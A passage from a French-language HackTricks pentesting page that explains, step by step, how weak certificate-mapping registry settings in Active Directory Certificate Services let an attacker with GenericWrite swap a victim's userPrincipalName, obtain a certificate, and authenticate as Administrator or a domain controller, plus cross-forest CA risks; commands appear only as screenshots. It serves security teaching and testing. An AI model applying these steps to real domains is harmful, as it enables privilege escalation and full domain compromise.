`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Valeur par défaut `0x18` (`0x8 | 0x10`), précédemment `0x1F`.

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Valeur par défaut `1`, précédemment `0`.

**Cas 1**

`StrongCertificateBindingEnforcement` réglé sur `0`

**Cas 2**

`CertificateMappingMethods` contient le bit `UPN` (`0x4`)

### Cas d'abus 1

* `StrongCertificateBindingEnforcement` réglé sur `0`
* `GenericWrite` sur n'importe quel compte A pour compromettre n'importe quel compte B

Dans ce cas, `John@corp.local` a `GenericWrite` sur `Jane@corp.local`, et nous souhaitons compromettre `Administrator@corp.local`. Les étapes d'abus sont presque identiques à ESC9, sauf que n'importe quel modèle de certificat peut être utilisé.

D'abord, nous obtenons le hash de `Jane` avec par exemple Shadow Credentials (en utilisant notre `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons le `userPrincipalName` de `Jane` pour qu'il soit `Administrator`. Remarquez que nous omettons la partie `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

Ceci n'est pas une violation de contrainte, puisque le `userPrincipalName` de l'utilisateur `Administrator` est `Administrator@corp.local` et non `Administrator`.

Maintenant, nous demandons n'importe quel certificat qui permet l'authentification client, par exemple le modèle par défaut `User`. Nous devons demander le certificat en tant que `Jane`.

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

Remarquez que le `userPrincipalName` dans le certificat est `Administrator`.

Ensuite, nous changeons à nouveau le `userPrincipalName` de `Jane` pour être autre chose, comme son `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Maintenant, si nous essayons de nous authentifier avec le certificat, nous recevrons le hash NT de l'utilisateur `Administrator@corp.local`. Vous devrez ajouter `-domain <domain>` à votre ligne de commande puisqu'il n'y a pas de domaine spécifié dans le certificat.

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### Cas d'abus 2

* `CertificateMappingMethods` contient le drapeau de bit `UPN` (`0x4`)
* `GenericWrite` sur n'importe quel compte A pour compromettre n'importe quel compte B sans propriété `userPrincipalName` (comptes machine et administrateur de domaine intégré `Administrator`)

Dans ce cas, `John@corp.local` a `GenericWrite` sur `Jane@corp.local`, et nous souhaitons compromettre le contrôleur de domaine `DC$@corp.local`.

D'abord, nous obtenons le hash de `Jane` avec par exemple Shadow Credentials (en utilisant notre `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons le `userPrincipalName` de `Jane` pour qu'il soit `DC$@corp.local`.

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

Ceci n'est pas une violation de contrainte, puisque le compte ordinateur `DC$` n'a pas de `userPrincipalName`.

Maintenant, nous demandons n'importe quel certificat qui permet l'authentification client, par exemple le modèle par défaut `User`. Nous devons demander le certificat en tant que `Jane`.

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons à nouveau le `userPrincipalName` de `Jane` pour être autre chose, comme son `userPrincipalName` original (`Jane@corp.local`).

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

Maintenant, puisque cette clé de registre s'applique à Schannel, nous devons utiliser le certificat pour l'authentification via Schannel. C'est là que l'option `-ldap-shell` de Certipy entre en jeu.

Si nous essayons de nous authentifier avec le certificat et `-ldap-shell`, nous remarquerons que nous sommes authentifiés en tant que `u:CORP\DC$`. Ceci est une chaîne envoyée par le serveur.

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

L'une des commandes disponibles pour le shell LDAP est `set_rbcd` qui définira la délégation contrainte basée sur les ressources (RBCD) sur la cible. Nous pourrions donc effectuer une attaque RBCD pour compromettre le contrôleur de domaine.

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

Alternativement, nous pouvons également compromettre n'importe quel compte utilisateur où il n'y a pas de `userPrincipalName` défini ou où le `userPrincipalName` ne correspond pas au `sAMAccountName` de ce compte. D'après mes propres tests, l'administrateur de domaine par défaut `Administrator@corp.local` n'a pas de `userPrincipalName` défini par défaut, et ce compte devrait par défaut avoir plus de privilèges dans LDAP que les contrôleurs de domaine.

## Compromettre des forêts avec des certificats

### Les CA brisent la confiance des forêts

La configuration pour **l'inscription inter-forêts** est relativement simple. Les administrateurs publient le **certificat de la CA racine** de la forêt de ressources **dans les forêts de comptes** et ajoutent les certificats de la **CA d'entreprise** de la forêt de ressources aux conteneurs **`NTAuthCertificates`** et AIA **dans chaque forêt de comptes**. Pour être clair, cela signifie que la **CA** dans la forêt de ressources a un **contrôle complet** sur toutes les **autres forêts pour lesquelles elle gère la PKI**. Si les attaquants **compromettent cette CA**, ils peuvent **forger des certificats pour tous les utilisateurs dans les forêts de ressources et de comptes**, brisant la limite de sécurité de la forêt.

### Principaux étrangers avec des privilèges d'inscription

Une autre chose dont les organisations doivent se méfier dans les environnements multi-forêts est les CA d'entreprise **publiant des modèles de certificats** qui accordent aux **Utilisateurs Authentifiés ou principaux étrangers** (utilisateurs/groupes externes à la forêt à laquelle appartient la CA d'entreprise) **des droits d'inscription et de modification**.\
Lorsqu'un compte **s'authentifie à travers une confiance**, AD ajoute le SID des **Utilisateurs Authentifiés** au jeton de l'utilisateur qui s'authentifie. Par conséquent, si un domaine a une CA d'entreprise avec un modèle qui **accorde des droits d'inscription aux Utilisateurs Authentifiés**, un utilisateur d'une autre forêt pourrait potentiellement **s'inscrire au modèle**. De même, si un modèle accorde explicitement à un **principal étranger des droits d'inscription**, alors une **relation de contrôle d'accès inter-forêts est créée**, permettant à un principal dans une forêt de **s'inscrire à un modèle dans une autre forêt**.

En fin de compte, ces deux scénarios **augmentent la surface d'attaque** d'une forêt à une autre. Selon les paramètres du modèle de certificat, un attaquant pourrait exploiter cela pour obtenir des privilèges supplémentaires dans un domaine étranger.

## Références

* Toutes les informations de cette page ont été prises de [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
